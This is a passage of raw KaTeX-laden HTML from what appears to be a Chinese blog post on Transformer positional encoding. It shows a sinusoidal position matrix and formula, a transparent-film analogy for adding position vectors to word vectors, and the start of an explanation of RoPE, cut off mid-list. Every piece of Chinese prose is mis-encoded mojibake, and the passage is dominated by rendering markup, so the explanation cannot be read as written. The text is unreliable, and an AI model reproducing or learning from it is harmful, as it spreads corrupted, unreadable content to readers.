stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">P = \begin{bmatrix}
 f_{0}(0) &amp; f_{1}(0) &amp; f_{2}(0)\\
  f_{0}(1)&amp;  f_{1}(1)&amp;f_{2}(1) \\
  f_{0}(2)&amp;  f_{1}(2)&amp;f_{2}(2)
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>ä¸ºå¶æ•°</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>ä¸ºå¥‡æ•°</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f_{i}(t) = \left\{\begin{matrix}
  sin(\frac{t}{10^{8i/D}} )
&amp; 
 iä¸ºå¶æ•°
\\
cos(\frac{t}{10^{8i/D}} )
  &amp;
iä¸ºå¥‡æ•°
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4508em;vertical-align:-0.9754em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">ä¸ºå¶æ•°</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">ä¸ºå¥‡æ•°</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>å…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>ä¸ºåºåˆ—ä¸­ç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>ä¸ªå‘é‡ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></span>è¡¨ç¤ºè¯å‘é‡çš„ç»´åº¦ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>è¡¨ç¤ºç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>ç»´ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>ä»0å¼€å§‹è®¡ç®—</p>
<p>å…¶å®å½“æ—¶æˆ‘å­¦åˆ°ä½ç½®ç¼–ç çš„æ—¶å€™ï¼Œæˆ‘å°±æœ‰ä¸€ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥å°†ä½ç½®ç¼–ç å’Œè¯å‘é‡è¿›è¡Œç›¸åŠ ï¼Ÿè¿™æ ·åšéš¾é“ä¸ä¼šç ´ååŸæœ‰è¯å‘é‡æœ¬èº«æ‰€åŒ…å«çš„ä¿¡æ¯å—ï¼Ÿä¸ºä»€ä¹ˆè¿™ä¸ªç›¸åŠ æ“ä½œå°±èƒ½èµ‹äºˆåŸåºåˆ—ä½ç½®ä¿¡æ¯ï¼Ÿ</p>
<p>ä¸‹é¢ä¸¾ä¸ªå½¢è±¡ä¸€ç‚¹çš„ä¾‹å­ï¼Œæƒ³è±¡ä¸€ä¸‹æˆ‘ä»¬çš„è¾“å…¥åºåˆ—æ˜¯ä¸€ç»„å›¾ç‰‡ï¼ˆæ‰¿è½½è¯­ä¹‰ä¿¡æ¯ï¼‰ï¼Œè€Œä½ç½®ç¼–ç æ˜¯ä¸€ç»„é€æ˜çš„ã€å°æœ‰ä½ç½®åºå·ï¼ˆå¦‚1,2,3â€¦ï¼‰çš„èƒ¶ç‰‡ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/242eb01598a34875a6702da8d915573f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=oYoriw76J04hve2yCv2%2FhRrLAUM%3D" alt="c16.jpg" width="90%" loading="lazy"/></p>
<p>å°†èƒ¶ç‰‡å åŠ åˆ°å›¾ç‰‡ä¸Šåï¼Œä½ æ—¢èƒ½æ¸…æ™°åœ°çœ‹åˆ°å›¾ç‰‡å†…å®¹ï¼ˆè¯­ä¹‰ï¼‰ï¼Œä¹Ÿèƒ½æ¯«ä¸è´¹åŠ›åœ°è¯†åˆ«å‡ºå åŠ åœ¨ä¸Šé¢çš„æ•°å­—ï¼ˆä½ç½®ï¼‰ã€‚ä¸¤è€…ä¿¡æ¯æ˜¯å…±å­˜çš„ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb745a4c9a08420e915d774a4da8c757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tViPJhuLi3MPxMpo8UXuNmfdMBw%3D" alt="c17.jpg" width="90%" loading="lazy"/></p>
<p>ä½ å¯èƒ½ä¼šè¯´ï¼Œä¸å¯¹å‘€ï¼Œæˆ‘ä»¬äººè„‘å¯æ˜¯è§è¿‡å¾ˆå¤šå›¾ç‰‡å’Œæ•°å­—çš„ï¼Œå½“ç„¶èƒ½è½»æ¾çš„çœ‹å‡ºæ¥å›¾ç‰‡ä¸­åµŒå…¥äº†æ•°å­—ï¼Œä½†æ˜¯Transformerå®ƒèƒ½çœ‹å‡ºæ¥å—ï¼ŸåŠ å…¥çš„è¿™äº›åºåˆ—ä¿¡æ¯éš¾é“ä¸ä¼šæ„æˆå™ªå£°å—ï¼Ÿ</p>
<p>ä¸è¦å¿˜äº†ï¼ŒTransformerå¯æ˜¯å¤§è¯­è¨€æ¨¡å‹çš„åŸºç¡€æ¶æ„ï¼Œå®ƒå¯æ˜¯éå¸¸å¼ºå¤§çš„ï¼ŒTransformeråŒºåˆ†åŸå§‹åºåˆ—ä¸­åŒ…å«çš„åºåˆ—ä¿¡æ¯å¯ä»¥è¯´æ˜¯å†ç®€å•ä¸è¿‡çš„äº‹æƒ…äº†ã€‚</p>
<p>ä»æ•°å­¦ä¸Šæ¥è§£é‡Šï¼Œä½ç½®ç¼–ç å°±æ˜¯<strong>åˆ©ç”¨äº†é«˜ç»´è¡¨ç¤ºç©ºé—´çš„å†—ä½™åº¦å’Œæ·±åº¦ç¥ç»ç½‘ç»œçš„å¼ºå¤§è§£è€¦èƒ½åŠ›</strong>ï¼Œè¯å‘é‡é€šå¸¸å­˜åœ¨äºæ•°ç™¾ç”šè‡³æ•°åƒç»´çš„é«˜ç»´ç©ºé—´ä¸­ã€‚åœ¨é«˜ç»´ç©ºé—´ä¸­ï¼Œå‘é‡æ–¹å‘æå…¶ä¸°å¯Œï¼Œä¸¤ä¸ªéšæœºå‘é‡å‡ ä¹æ€»æ˜¯è¿‘ä¼¼æ­£äº¤çš„ï¼ˆç‚¹ç§¯æ¥è¿‘é›¶ï¼‰ã€‚è¯å‘é‡å’Œä½ç½®ç¼–ç å‘é‡å¯ä»¥çœ‹ä½œæ˜¯ä»ä¸åŒâ€œåæ ‡ç³»â€å‡ºå‘çš„å‘é‡ã€‚ç®€å•çš„ç›¸åŠ ï¼Œç›¸å½“äºåœ¨é«˜ç»´ç©ºé—´ä¸­è¿›è¡Œäº†ä¸€æ¬¡â€œåˆæˆâ€ã€‚åœ¨é«˜ç»´ç©ºé—´ä¸­ï¼Œä½ç›¸å…³æ€§çš„å‘é‡ç›¸åŠ ä¸ä¼šå¯¼è‡´ä¿¡æ¯ä¸¢å¤±ï¼Œåè€Œå½¢æˆå”¯ä¸€å¤åˆè¡¨ç¤ºã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬æš‚ä¸æ·±å…¥æ¢è®¨ä¸ºä½•ç®€å•çš„äºŒè¿›åˆ¶ç¼–ç ä¸è¢«é‡‡ç”¨ï¼Œè€Œæ­£å¼¦ä½™å¼¦ç¼–ç å´å¦‚æ­¤æœ‰æ•ˆâ€”â€”è¿™èƒŒåæ¶‰åŠåˆ°å¾ˆå¤šæ•°å­¦ç†è®ºä¸Šçš„ä¸œè¥¿äº†ã€‚ä½†å¦‚æœä½ å¯¹æ­£ä½™å¼¦ä½ç½®ç¼–ç æ„Ÿå…´è¶£ï¼Œéå¸¸æ¨èçœ‹çœ‹è¿™ä½UPä¸»çš„è®²è§£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1XH4y1T76e%2F" target="_blank" title="https://www.bilibili.com/video/BV1XH4y1T76e/" ref="nofollow noopener noreferrer">ç‹æœ¨å¤´å­¦ç§‘å­¦</a></p>
<p>ç„¶è€Œï¼ŒæŠ€æœ¯æ€»æ˜¯åœ¨æ¼”è¿›ã€‚åœ¨å½“ä»Šå¤§è¯­è¨€æ¨¡å‹çš„å®è·µä¸­ï¼Œæ ‡å‡†çš„æ­£å¼¦ä½™å¼¦ä½ç½®ç¼–ç å·²ä¸å†æ˜¯ä¸»æµçš„é€‰æ‹©ã€‚ç ”ç©¶è€…ä»¬å‘ç°ï¼Œç›´æ¥è®©æ¨¡å‹å…³æ³¨<strong>å…ƒç´ çš„ç›¸å¯¹ä½ç½®</strong>å¾€å¾€æ¯”è®°ä½ç»å¯¹ä½ç½®æ›´ä¸ºæœ‰æ•ˆå’Œæ³›åŒ–ã€‚å› æ­¤ï¼Œä¸€ç³»åˆ—æ›´å…ˆè¿›çš„<strong>ç›¸å¯¹ä½ç½®ç¼–ç </strong>æ–¹æ³•åº”è¿è€Œç”Ÿï¼Œä¾‹å¦‚ï¼šALiBiï¼ŒRoPE, YaRN, T5 Relative...</p>
<p>ç”±äºRoPEæ—‹è½¬ä½ç½®ç¼–ç æ¯”è¾ƒæµè¡Œï¼Œä¸‹é¢å°±ç®€å•çš„è®²è§£ä¸€ä¸‹å…¶ç®—æ³•æµç¨‹</p>
<p>æˆ‘ä»¬æŠ›å¼€æ‰€æœ‰ä¸Šé¢è®²è¿‡çš„å†…å®¹ï¼Œä»…ä»æ•°å­¦çš„è§’åº¦çœ‹çœ‹å¦‚ä½•å¯¹ä»»æ„çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>è¿›è¡ŒRoPEå˜æ¢</p>
<ul>
<li>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>è¡Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>åˆ—çŸ©é˜µï¼ˆå…±<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>ä¸ªç»´åº¦ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>çš„å‘é‡ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>å¿…é¡»ä¸ºå¶æ•°ï¼‰</p>
</li>
<li>
